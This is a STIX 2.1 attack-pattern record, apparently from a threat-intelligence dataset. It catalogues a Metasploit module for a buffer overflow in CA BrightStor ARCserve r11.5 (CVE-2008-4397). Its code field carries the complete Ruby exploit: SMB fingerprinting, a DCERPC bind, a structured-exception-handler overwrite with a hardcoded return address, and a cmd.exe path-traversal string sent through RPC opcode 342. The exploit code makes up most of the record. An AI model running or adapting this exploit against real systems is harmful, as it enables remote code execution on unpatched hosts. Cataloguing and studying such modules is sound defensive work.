{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a76892da-f730-4f42-a926-522af1c7589c",
    "created": "2024-08-14T16:48:17.063459Z",
    "modified": "2024-08-14T16:48:17.063462Z",
    "name": "Computer Associates ARCserve REPORTREMOTEEXECUTECML Buffer Overflow",
    "description": " This module exploits a buffer overflow in Computer Associates BrightStor ARCserve r11.5 (build 3884). By sending a specially crafted RPC request to opcode 0x342, an attacker could overflow the buffer and execute arbitrary code. In order to successfully exploit this vulnerability, you will need set the hostname argument (HNAME). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/brightstor/ca_arcserve_342.rb",
            "external_id": "ca_arcserve_342.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-4397"
        },
        {
            "source_name": "reference",
            "url": "http://crackinglandia.blogspot.com/2009/10/el-colador-de-ca-computer-associates.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::DCERPC\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Remote::Seh\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Computer Associates ARCserve REPORTREMOTEEXECUTECML Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow in Computer Associates BrightStor ARCserve r11.5 (build 3884).\n        By sending a specially crafted RPC request to opcode 0x342, an attacker could overflow the buffer\n        and execute arbitrary code. In order to successfully exploit this vulnerability, you will need\n        set the hostname argument (HNAME).\n      },\n      'Author'         => [ 'Nahuel Cayento Riva', 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'BID', '31684' ],\n          [ 'OSVDB', '49468' ],\n          [ 'CVE', '2008-4397' ],\n          [ 'URL', 'http://crackinglandia.blogspot.com/2009/10/el-colador-de-ca-computer-associates.html' ],\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 550,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\",\n          'PrependEncoder' => \"\\x81\\xc4\\xff\\xef\\xff\\xff\\x44\",\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          [ 'Computer Associates BrightStor ARCserve r11.5 (build 3884)', { 'Ret' => 0x2123bdf4 } ], # ASCORE.dll 11.5.3884.0\n        ],\n      'DisclosureDate' => '2008-10-09',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('HNAME', [ true,  'The NetBios hostname of the target.']),\n        Opt::RPORT(6504)\n      ])\n  end\n\n  def fingerprint\n\n    datastore['RPORT'] = 445\n    os = smb_fingerprint()\n    return os\n\n  end\n\n  def exploit\n\n    path = fingerprint()\n\n    if (path['os'] !~ /Windows/)\n      print_error(\"Target not supported!\")\n      return\n    elsif (path['os'] =~ /Windows 2000/)\n      dir = \"winnt\"\n      offset = 442\n    else\n      dir = \"windows\"\n      offset = 436\n    end\n\n    print_status(\"Identified OS '#{path['os']}', setting appropiate system path...\")\n\n    datastore['RPORT'] = 6504\n\n    connect()\n\n    handle = dcerpc_handle('506b1890-14c8-11d1-bbc3-00805fa6962e', '1.0', 'ncacn_ip_tcp', [datastore['RPORT']])\n    print_status(\"Binding to #{handle} ...\")\n\n    dcerpc_bind(handle)\n    print_status(\"Bound to #{handle} ...\")\n\n    buffer = rand_text_alpha_upper(offset) + generate_seh_payload(target.ret)\n\n    sploit =  NDR.string(\"#{datastore['HNAME'].upcase}\")\n    sploit << NDR.string(\"..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\#{dir}\\\\system32\\\\cmd /c \\\"\"\"\\\"\"\"\")\n    sploit << NDR.string(buffer)\n    sploit << NDR.string(rand_text_alpha_upper(20))\n    sploit << NDR.long(2)\n    sploit << NDR.long(2)\n    sploit << NDR.string(rand_text_alpha_upper(20))\n    sploit << NDR.long(0)\n    sploit << NDR.long(4)\n\n    print_status(\"Trying target #{target.name}...\")\n\n      begin\n        dcerpc_call(342, sploit)\n        rescue Rex::Proto::DCERPC::Exceptions::NoResponse\n      end\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-10-09",
    "x_mitre_platforms": [
        "win'"
    ]
}